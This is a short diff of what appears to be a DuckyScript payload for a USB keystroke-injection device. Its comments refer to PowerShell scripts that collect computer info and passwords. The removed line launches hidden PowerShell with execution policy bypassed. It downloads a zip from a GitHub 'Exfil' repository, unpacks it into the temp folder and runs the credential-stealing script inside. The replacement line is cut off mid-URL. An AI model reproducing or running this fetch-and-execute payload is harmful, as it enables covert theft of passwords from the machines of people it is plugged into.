@@ -32,5 +32,4 @@ REM#				#3) = pubI+P.ps1 - comp (I)nfo (+) (P)asswords.
 REM#				#4) = WMpubI+P.ps1 - comp (I)nfo (+) (P)asswords; 60 seconds after Mouse Movement
 REM
 REM
-STRING powershell -w h -NoP -NonI -Exec Bypass $D="$env:tmp";mkdir -F -P $D\pass;iwr 'https://github.com/luciferseamus/Exfil/raw/main/public/PubE.zip' -O $D\E.zip;Expand-Archive "$D\E.zip" -Des $D\pass -Force;cd $D\pass;.\'pubI.ps1'
-ENTER
+STRING powershell -w h -NoP -NonI -Exec Bypass $D="$env:tmp";mkdir -F -P $D\pass;iwr 'https://github.com/lucifers
